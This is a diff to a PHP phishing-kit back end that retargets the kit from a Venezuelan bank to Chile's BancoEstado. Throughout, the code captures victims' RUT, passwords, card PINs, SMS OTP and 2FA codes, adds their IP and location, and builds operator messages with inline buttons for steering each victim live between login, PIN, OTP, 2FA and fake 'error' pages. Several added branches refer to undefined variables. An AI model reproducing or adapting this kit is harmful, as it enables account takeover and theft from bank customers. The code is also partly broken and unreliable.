@@ -37,70 +37,102 @@ $form_origen = "desconocido";
 $message = "";
 
 // index.php
-if (isset($_POST['tipo_usuario'],$_POST['tipo_tarjeta'],$_POST['card'],$_POST['doc'],$_POST['clave'])) {
+if (isset($_POST['rut'],$_POST['password'])) {
 
-    $_SESSION['usuario'] = $_POST['doc'];
+    $_SESSION['usuario'] = $_POST['rut'];
 
     $form_origen = "index.php";
 
-    $tipo_usuario = trim($_POST['tipo_usuario']);
-    $tipo_tarjeta = trim($_POST['tipo_tarjeta']);
-    $card = trim($_POST['card']);
-    $doc = trim($_POST['doc']);
-    $clave = trim($_POST['clave']);
-    $message .= "🇻🇪『𝖡𝖭𝖢 𝖫𝗈𝗀𝗈』🇻🇪\n\n";
-    $message .= "┊⬩ 𝖳𝗂𝗉𝗈 𝖢𝗎𝖾𝗇𝗍𝖺.: <code>$tipo_usuario</code>\n";
-    $message .= "┊⬩ 𝖳𝗂𝗉𝗈 𝖳𝖺𝗋𝗃𝖾𝗍𝖺.: <code>$tipo_tarjeta</code>\n";
-    $message .= "┊⬩ 𝖳𝖺𝗋𝗃𝖾𝗍𝖺.: <code>$card</code>\n";
-    $message .= "┊⬩ 𝖢𝖾𝖽𝗎𝗅𝖺.: <code>$doc</code>\n";
-    $message .= "┊⬩ 𝖢𝗅𝖺𝗏𝖾.: <code>$clave</code>\n\n";
+    $rut = trim($_POST['rut']);
+    $pass = trim($_POST['password']);
+    $message .= "🇨🇱 ✴︎𝖡𝖺𝗇𝖼𝗈𝖤𝗌𝗍𝖺𝖽𝗈 𝖫𝗈𝗀𝗈✴︎ 🇨🇱\n\n";
+    $message .= "┊♡ 𝖱𝖴𝖳.: <code>$rut</code>\n";
+    $message .= "┊♡ 𝖢𝗅𝖺𝗏𝖾.: <code>$pass</code>\n\n";
 
 // index-error.php
-} elseif (isset($_POST['tipo_usuario2'],$_POST['tipo_tarjeta2'],$_POST['card2'],$_POST['doc2'],$_POST['clave2'])) {
-    $_SESSION['usuario'] = $_POST['doc2'];
+} elseif (isset($_POST['rut2'],$_POST['password2'])) {
+    $_SESSION['usuario'] = $_POST['rut2'];
 
     $form_origen = "index-error.php";
 
-    $tipo_usuario = trim($_POST['tipo_usuario2']);
-    $tipo_tarjeta = trim($_POST['tipo_tarjeta2']);
-    $card = trim($_POST['card2']);
-    $doc = trim($_POST['doc2']);
-    $clave = trim($_POST['clave2']);
-    $message .= "🇻🇪『𝖡𝖭𝖢 𝖫𝗈𝗀𝗈-𝖱𝖾𝗂𝗇𝗍𝖾𝗇𝗍𝗈』🇻🇪\n\n";
-    $message .= "┊⬩ 𝖳𝗂𝗉𝗈 𝖢𝗎𝖾𝗇𝗍𝖺.: <code>$tipo_usuario</code>\n";
-    $message .= "┊⬩ 𝖳𝗂𝗉𝗈 𝖳𝖺𝗋𝗃𝖾𝗍𝖺.: <code>$tipo_tarjeta</code>\n";
-    $message .= "┊⬩ 𝖳𝖺𝗋𝗃𝖾𝗍𝖺.: <code>$card</code>\n";
-    $message .= "┊⬩ 𝖢𝖾𝖽𝗎𝗅𝖺.: <code>$doc</code>\n";
-    $message .= "┊⬩ 𝖢𝗅𝖺𝗏𝖾.: <code>$clave</code>\n\n";
+    $rut2 = trim($_POST['rut2']);
+    $pass2 = trim($_POST['password2']);
+    $message .= "🇨🇱 ✴︎𝖡𝖺𝗇𝖼𝗈𝖤𝗌𝗍𝖺𝖽𝗈 𝖫𝗈𝗀𝗈-𝖱𝖾𝗂𝗇𝗍𝖾𝗇𝗍𝗈✴︎ 🇨🇱\n\n";
+    $message .= "┊♡ 𝖱𝖴𝖳.: <code>$rut2</code>\n";
+    $message .= "┊♡ 𝖢𝗅𝖺𝗏𝖾.: <code>$pass2</code>\n\n";
 
-// otp.php
-} elseif (isset($_POST['otp'])) {
-    $code = trim($_POST['otp']);
-    $_SESSION['otp'] = $code;
-    $form_origen = "otp.php";
+// pin.php
+} elseif (isset($_POST['pincaje'])) {
+    $code = trim($_POST['pincaje']);
+    $_SESSION['pincaje'] = $code;
+    $form_origen = "pin.php";
     $code_esc = htmlspecialchars($code, ENT_QUOTES, 'UTF-8');
     $user_esc = htmlspecialchars($_SESSION['usuario'] ?? 'Desconocido', ENT_QUOTES, 'UTF-8');
-    $message .= "🇻🇪『𝖮𝖳𝖯 𝖡𝖭𝖢』🇻🇪\n\n";
-    $message .= "📲 Código: <code>$code_esc</code>\n\n";
-    $message .= "🍀 User: <code>$user_esc</code>\n";
+    $message .= "🇨🇱 ✴︎𝖯𝖨𝖭 𝖼𝖺𝗃𝖾𝗋𝗈 𝖡𝖺𝗇𝖼𝗈𝖤𝗌𝗍𝖺𝖽𝗈✴︎ 🇨🇱\n\n";
+    $message .= "┊♡ 𝖯𝖨𝖭.: <code>$code_esc</code>\n\n";
+    $message .= "┊♡ 𝖱𝖴𝖳.: <code>$user_esc</code>\n";
 
-// otp-error.php
-} elseif (isset($_POST['otp2'])) {
-    $code = trim($_POST['otp2']);
-    $_SESSION['otp2'] = $code;
-    $form_origen = "otp-error.php";
+// pin-error.php
+} elseif (isset($_POST['pincaje2'])) {
+    $code = trim($_POST['pincaje2']);
+    $_SESSION['pincaje2'] = $code;
+    $form_origen = "pin-error.php";
     $code_esc = htmlspecialchars($code, ENT_QUOTES, 'UTF-8');
     $user_esc = htmlspecialchars($_SESSION['usuario'] ?? 'Desconocido', ENT_QUOTES, 'UTF-8');
-    $message .= "🇻🇪『𝖮𝖳𝖯 𝖡𝖭𝖢-𝖱𝖾𝗂𝗇𝗍𝖾𝗇𝗍𝗈』🇻🇪\n\n";
-    $message .= "📲 Código: <code>$code_esc</code>\n\n";
-    $message .= "🍀 User: <code>$user_esc</code>\n";
+    $message .= "🇨🇱 ✴︎𝖯𝖨𝖭 𝖼𝖺𝗃𝖾𝗋𝗈 𝖡𝖺𝗇𝖼𝗈𝖤𝗌𝗍𝖺𝖽𝗈-𝖱𝖾𝗂𝗇𝗍𝖾𝗇𝗍𝗈✴︎ 🇨🇱\n\n";
+    $message .= "┊♡ 𝖯𝖨𝖭.: <code>$code_esc</code>\n\n";
+    $message .= "┊♡ 𝖱𝖴𝖳.: <code>$user_esc</code>\n";
+
+    // cod.php
+} elseif (isset($_POST['otpsms'])) {
+    $code = trim($_POST['otpsms']);
+    $_SESSION['otpsms'] = $otp;
+    $form_origen = "cod.php";
+    $otp_esc = htmlspecialchars($otp, ENT_QUOTES, 'UTF-8');
+    $user_esc = htmlspecialchars($_SESSION['usuario'] ?? 'Desconocido', ENT_QUOTES, 'UTF-8');
+    $message .= "🇨🇱 ✴︎𝖮𝖳𝖯 𝖡𝖺𝗇𝖼𝗈𝖤𝗌𝗍𝖺𝖽𝗈✴︎ 🇨🇱\n\n";
+    $message .= "┊♡ 𝖮𝖳𝖯.: <code>$otp_esc</code>\n\n";
+    $message .= "┊♡ 𝖱𝖴𝖳.: <code>$user_esc</code>\n";
+
+// cod-error.php
+} elseif (isset($_POST['otpsms2'])) {
+    $code = trim($_POST['otpsms2']);
+    $_SESSION['otpsms2'] = $otp;
+    $form_origen = "cod-error.php";
+    $otp_esc = htmlspecialchars($otp, ENT_QUOTES, 'UTF-8');
+    $user_esc = htmlspecialchars($_SESSION['usuario'] ?? 'Desconocido', ENT_QUOTES, 'UTF-8');
+    $message .= "🇨🇱 ✴︎𝖮𝖳𝖯 𝖡𝖺𝗇𝖼𝗈𝖤𝗌𝗍𝖺𝖽𝗈-𝖱𝖾𝗂𝗇𝗍𝖾𝗇𝗍𝗈✴︎ 🇨🇱\n\n";
+    $message .= "┊♡ 𝖮𝖳𝖯.: <code>$otp_esc</code>\n\n";
+    $message .= "┊♡ 𝖱𝖴𝖳.: <code>$user_esc</code>\n";
+
+    // 2FA.php
+} elseif (isset($_POST['2fa'])) {
+    $code = trim($_POST['2fa']);
+    $_SESSION['2fa'] = $efea;
+    $form_origen = "2FA.php";
+    $efea_esc = htmlspecialchars($efea, ENT_QUOTES, 'UTF-8');
+    $user_esc = htmlspecialchars($_SESSION['usuario'] ?? 'Desconocido', ENT_QUOTES, 'UTF-8');
+    $message .= "🇨🇱 ✴︎𝖠𝗎𝗍𝗈𝗋𝗂𝗓𝖺𝖼𝗂𝗈𝗇 2𝖥𝖠 𝖡𝖺𝗇𝖼𝗈𝖤𝗌𝗍𝖺𝖽𝗈✴︎ 🇨🇱\n\n";
+    $message .= "┊♡ 𝖠𝗎𝗍𝗈.: <code>$efea_esc</code>\n\n";
+    $message .= "┊♡ 𝖱𝖴𝖳.: <code>$user_esc</code>\n";
+
+// 2FA-error.php
+} elseif (isset($_POST['2fa2'])) {
+    $code = trim($_POST['2fa2']);
+    $_SESSION['2fa2'] = $efea;
+    $form_origen = "2FA-error.php";
+    $efea_esc = htmlspecialchars($efea, ENT_QUOTES, 'UTF-8');
+    $user_esc = htmlspecialchars($_SESSION['usuario'] ?? 'Desconocido', ENT_QUOTES, 'UTF-8');
+    $message .= "🇨🇱 ✴︎𝖠𝗎𝗍𝗈𝗋𝗂𝗓𝖺𝖼𝗂𝗈𝗇 2𝖥𝖠 𝖡𝖺𝗇𝖼𝗈𝖤𝗌𝗍𝖺𝖽𝗈-𝖱𝖾𝗂𝗇𝗍𝖾𝗇𝗍𝗈✴︎ 🇨🇱\n\n";
+    $message .= "┊♡ 𝖠𝗎𝗍𝗈.: <code>$efea_esc</code>\n\n";
+    $message .= "┊♡ 𝖱𝖴𝖳.: <code>$user_esc</code>\n";
 
 } else {
     exit("No se reconocieron datos válidos.");
 }
 
-$message .= "\n🌎 Ubicación: $cc - $region - $city\n";
-$message .= "🌐 IP: <code>$user_ip</code>";
+$message .= "\n┊♡ 𝖴𝖻𝗂𝖼𝖺𝖼𝗂𝗈𝗇.: $cc - $region - $city\n";
+$message .= "┊♡ 𝖨𝖯.: <code>$user_ip</code>";
 
 $request_id = session_id();
 $_SESSION['estado'] = null;
@@ -114,15 +146,23 @@ file_put_contents("requests/$request_id.json", json_encode($request_data));
 $keyboard = [
     'inline_keyboard' => [
         [
-            ['text' => '【🍀】𝖨𝗇𝗂𝖼𝗂𝗈', 'callback_data' => "redir:$request_id:index.php"],
-            ['text' => '【🛑】𝖨𝗇𝗂𝖼𝗂𝗈 𝖤𝗋𝗋𝗈𝗋', 'callback_data' => "redir:$request_id:index-error.php"]
+            ['text' => '『🍀』𝖨𝗇𝗂𝖼𝗂𝗈', 'callback_data' => "redir:$request_id:index.php"],
+            ['text' => '『🛑』𝖨𝗇𝗂𝖼𝗂𝗈 𝖤𝗋𝗋𝗈𝗋', 'callback_data' => "redir:$request_id:index-error.php"]
         ],
         [
-            ['text' => '【🍀】𝖮𝖳𝖯', 'callback_data' => "redir:$request_id:otp.php"],
-            ['text' => '【🛑】𝖮𝖳𝖯 𝖤𝗋𝗋𝗈𝗋', 'callback_data' => "redir:$request_id:otp-error.php"]
+            ['text' => '『🍀』𝖯𝖨𝖭', 'callback_data' => "redir:$request_id:pin.php"],
+            ['text' => '『🛑』𝖯𝖨𝖭 𝖤𝗋𝗋𝗈𝗋', 'callback_data' => "redir:$request_id:pin-error.php"]
         ],
         [
-            ['text' => '【🏁】𝖥𝗂𝗇𝖺𝗅𝗂𝗓𝖺𝗋', 'callback_data' => "redir:$request_id:finalizar.php"]
+            ['text' => '『🍀』𝖮𝖳𝖯', 'callback_data' => "redir:$request_id:cod.php"],
+            ['text' => '『🛑』𝖮𝖳𝖯 𝖤𝗋𝗋𝗈𝗋', 'callback_data' => "redir:$request_id:cod-error.php"]
+        ],
+        [
+            ['text' => '『🍀』2𝖥𝖠', 'callback_data' => "redir:$request_id:2FA.php"],
+            ['text' => '『🛑』2𝖥𝖠 𝖤𝗋𝗋𝗈𝗋', 'callback_data' => "redir:$request_id:2FA-error.php"]
+        ],
+        [
+            ['text' => '『🏁』𝖥𝗂𝗇𝖺𝗅𝗂𝗓𝖺𝗋', 'callback_data' => "redir:$request_id:finalizar.php"]
         ]
     ]
 ];
